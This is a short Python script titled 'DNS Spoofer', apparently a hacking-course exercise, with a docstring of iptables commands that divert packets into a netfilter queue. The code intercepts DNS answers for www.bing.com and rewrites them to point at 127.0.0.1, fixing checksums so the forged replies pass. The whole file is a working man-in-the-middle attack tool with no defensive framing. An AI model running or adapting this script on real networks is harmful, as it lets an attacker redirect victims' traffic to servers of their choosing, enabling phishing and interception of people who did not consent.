#!/usr/bin/env python

"""
DNS Spoofer

# trap packets in queue
iptables -I FORWARD -j NFQUEUE --queue-num 0
# local
iptables -I OUTPUT -j NFQUEUE --queue-num 0
iptables -I INPUT -j NFQUEUE --queue-num 0
# delete tables
iptables -- flush

# netfilter
pip install netfilterqueue

# ping
ping -c 1 www.google.com
"""


import scapy.all as scapy
import netfilterqueue


def process_packet(packet):
    target_url = "www.bing.com"
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if target_url in qname:
            print("[+] Spoofing target")
            # rdata = redirected IP
            answer = scapy.DNSRR(rrname=qname, rdata="127.0.0.1")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
